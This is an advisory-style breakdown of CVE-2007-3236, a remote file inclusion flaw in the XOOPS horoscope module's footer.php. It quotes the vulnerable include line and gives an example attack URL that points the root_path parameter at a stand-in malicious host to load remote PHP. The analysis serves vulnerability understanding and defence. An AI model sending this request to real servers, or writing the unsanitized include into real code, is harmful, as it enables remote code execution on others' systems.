Based on the provided content, here's the breakdown of the vulnerability:

**CVE ID:** CVE-2007-3236

**Root Cause:** The vulnerability stems from a Remote File Inclusion (RFI) flaw in the `footer.php` file of the XOOPS module "horoscope" version 2.0.

**Weaknesses/Vulnerabilities Present:**
*   **Remote File Inclusion (RFI):** The `footer.php` script includes a file using a variable, `$xoopsConfig['root_path']`, without proper sanitization. This allows an attacker to control the included file's path.

**Impact of Exploitation:**
*   **Arbitrary Code Execution:** By injecting a malicious URL into `xoopsConfig['root_path']`, an attacker can force the server to include and execute code from a remote server. This enables them to execute arbitrary code on the server hosting the vulnerable application, which could lead to full system compromise.

**Attack Vectors:**
*   **HTTP GET Request:** The vulnerability is triggered via an HTTP GET request to `modules/horoscope/footer.php`. The malicious file path is supplied through the `xoopsConfig[root_path]` parameter in the URL.

**Required Attacker Capabilities/Position:**
*   **Network Access:** The attacker needs network access to the vulnerable server to send the malicious HTTP request.
*   **Basic HTTP Knowledge:** The attacker needs to be familiar with crafting HTTP GET requests and how to inject parameters.

**Technical Details:**
The `footer.php` file contains the following line, which is vulnerable:
```php
include_once($xoopsConfig['root_path']."footer.php");
```
The attacker can manipulate the `$xoopsConfig['root_path']` parameter to point to a file on a remote server containing malicious PHP code.

**Example Attack Vector:**
```
modules/horoscope/footer.php?xoopsConfig[root_path]=http://malicious.server/evil.php
```
In this example, the server will attempt to include and execute the `evil.php` file from `http://malicious.server/`, resulting in the execution of the attacker's malicious code.

**Additional Notes:**
*   The exploit-db entry also indicates the vulnerable application is "XOOPS Modules Horoscope" version 2.0
